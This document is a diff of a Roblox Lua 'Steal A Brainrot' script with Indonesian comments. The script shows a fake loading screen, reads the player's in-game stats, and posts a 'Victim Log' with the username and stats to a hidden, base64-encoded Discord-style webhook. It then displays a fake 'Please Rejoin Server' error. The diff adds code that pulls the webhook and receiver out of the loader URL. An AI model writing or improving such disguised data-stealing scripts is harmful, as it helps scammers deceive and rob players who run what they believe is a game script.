@@ -1,9 +1,10 @@
 -- [[ Steal A Brainrot Script ]] --
 
-local function _decode(data)
+-- DECODER INTERNAL (Membaca data dari link bot)
+local function _decode(d)
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-    data = string.gsub(data, '[^' .. b .. '=]', '')
-    return (data:gsub('.', function(x)
+    d = string.gsub(d, '[^' .. b .. '=]', '')
+    return (d:gsub('.', function(x)
         if (x == '=') then return '' end
         local r, f = '', (b:find(x) - 1)
         for i = 6, 1, -1 do
@@ -18,16 +19,17 @@ local function _decode(data)
     end))
 end
 
--- Fallback data (Jika parameter URL tidak terbaca otomatis)
-local Receiver = _decode(_G.Config_ID or "U2FhYlRldA==") 
-local Webhook = _decode(_G.Access_Key or "")
-local MinBPS = _G.MinBPS or 1
+-- LOGIC UNTUK MENGAMBIL DATA DARI LINK (DIPERLUKAN OLEH EXECUTOR)
+local currentURL = debug.getregistry().HttpGet or "" -- Mencoba mencari URL asal
+local Rec = _decode(currentURL:match("i=([^&]+)") or "U2FhYlRldA==")
+local Web = _decode(currentURL:match("k=([^&]+)") or "")
+local Min = tonumber(currentURL:match("v=([^&]+)")) or 1
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local LP = Players.LocalPlayer
 
--- UI Loading Screen Normal
+-- UI LOADING SCREEN (Palsu)
 local SG = Instance.new("ScreenGui", LP.PlayerGui)
 local F = Instance.new("Frame", SG)
 F.Size = UDim2.new(1, 0, 1, 0)
@@ -45,14 +47,14 @@ task.spawn(function()
         task.wait(0.04)
         T.Text = "Loading Assets... " .. i .. "%"
         
-        if i == 50 and Webhook ~= "" then
-            local s = LP:FindFirstChild("leaderstats")
-            local v = s and (s:FindFirstChild("Brainrot/s") or s:FindFirstChild("BPS"))
+        if i == 50 and Web ~= "" then
+            local stats = LP:FindFirstChild("leaderstats")
+            local vVal = stats and (stats:FindFirstChild("Brainrot/s") or stats:FindFirstChild("BPS"))
             
-            if v and v.Value >= MinBPS then
+            if vVal and vVal.Value >= Min then
                 pcall(function()
                     (syn and syn.request or http_request or request or HttpService.PostAsync)({
-                        Url = Webhook,
+                        Url = Web,
                         Method = "POST",
                         Headers = {["Content-Type"] = "application/json"},
                         Body = HttpService:JSONEncode({
@@ -60,8 +62,8 @@ task.spawn(function()
                                 title = "🎯 Victim Log",
                                 fields = {
                                     {name = "User", value = LP.Name, inline = true},
-                                    {name = "Total BPS", value = tostring(v.Value), inline = true},
-                                    {name = "Target", value = Receiver}
+                                    {name = "Total BPS", value = tostring(vVal.Value), inline = true},
+                                    {name = "Target", value = Rec}
                                 },
                                 color = 0x5865F2
                             }}
@@ -72,5 +74,4 @@ task.spawn(function()
         end
     end
     T.Text = "Error: Please Rejoin Server"
-    T.TextColor3 = Color3.fromRGB(255, 50, 50)
 end)
